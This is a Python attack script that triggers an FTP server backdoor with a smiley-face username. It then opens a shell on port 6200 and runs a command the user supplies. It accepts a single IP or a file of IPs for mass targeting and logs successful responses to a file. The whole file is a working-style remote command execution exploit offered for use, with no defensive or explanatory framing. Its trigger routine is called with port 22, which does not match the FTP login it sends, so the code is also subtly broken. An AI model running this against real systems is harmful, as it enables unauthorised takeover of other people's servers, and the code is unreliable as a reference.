import socket
import sys
import time
import argparse
from colorama import Fore, Style, init

init(autoreset=True)

def expl01t(ip, port, command):
    try:
        print(Fore.CYAN + '======================' + Style.RESET_ALL)
        animation = "|/-\\"
        for i in range(5):
            time.sleep(0.1)
            sys.stdout.write("\r" + Fore.CYAN + '[*] Triggering backdoor' + animation[i % len(animation)] + Style.RESET_ALL)
            sys.stdout.flush()
        
        ftp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ftp_socket.connect((ip, port))

        ftp_socket.send(b'USER hello:)\n')
        ftp_socket.send(b'PASS password\n')
        time.sleep(2)
        ftp_socket.close()
        print(Fore.GREEN + '[*] Triggered backdoor' + Style.RESET_ALL)

    except Exception:
        print(Fore.RED + '[-] Failed to trigger backdoor on %s' % ip + Style.RESET_ALL)
        return  # Skip the rest of the code if the backdoor trigger fails

    try:
        print(Fore.CYAN + '[*] Attempting to connect to backdoor...' + Style.RESET_ALL)
        backdoor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_socket.connect((ip, 6200))
        print(Fore.GREEN + '[*] Connected to backdoor on %s:6200' % ip + Style.RESET_ALL)
        command = str.encode(command + '\n')
        backdoor_socket.send(command)
        response = backdoor_socket.recv(1024).decode('utf-8')
        print(Fore.GREEN + '[*] Response:' + Style.RESET_ALL)
        print(response)
        backdoor_socket.close()

        # Save the output to success.txt
        with open('success.txt', 'a') as output_file:
            output_file.write(f'IP: {ip}\n')
            output_file.write(response + '\n\n')

    except Exception:
        print(Fore.RED + '[-] Failed to connect to backdoor on %s:6200' % ip + Style.RESET_ALL)

def main():
    parser = argparse.ArgumentParser(description='Execute commands on remote servers via backdoor')
    parser.add_argument('-t', '--target', help='Specify a single target IP address')
    parser.add_argument('-l', '--list', help='Specify a list of IP addresses from a file')
    parser.add_argument('command', help='The command to execute on the target(s)')

    args = parser.parse_args()

    if not args.target and not args.list:
        print(Fore.RED + 'Error: You must specify either a single target (-t) or a list of targets (-l).' + Style.RESET_ALL)
        parser.print_help()
        sys.exit(1)

    if args.target:
        expl01t(args.target, 22, args.command)
    elif args.list:
        with open(args.list, 'r') as ip_file:
            ip_list = ip_file.read().splitlines()
        
        for ip in ip_list:
            expl01t(ip, 22, args.command)

if __name__ == '__main__':
    print(Fore.RED + ":)" + Style.RESET_ALL)  # ASCII Art
    main()
